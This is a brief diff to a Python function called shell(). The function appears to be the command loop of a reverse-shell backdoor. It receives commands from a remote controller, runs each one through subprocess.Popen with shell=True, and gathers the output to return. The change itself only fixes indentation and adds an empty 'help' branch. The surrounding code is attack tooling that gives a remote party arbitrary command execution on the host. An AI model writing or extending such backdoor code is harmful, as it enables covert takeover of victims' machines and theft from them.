@@ -19,7 +19,9 @@ def shell():
     while True:
         command = reliable_recv()
         if command == 'quit':
-                break
+            break
+        elif command == 'help':
+            pass
         execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         result = execute.stdout.read() + execute.stderr.read()
         result = result.decode()
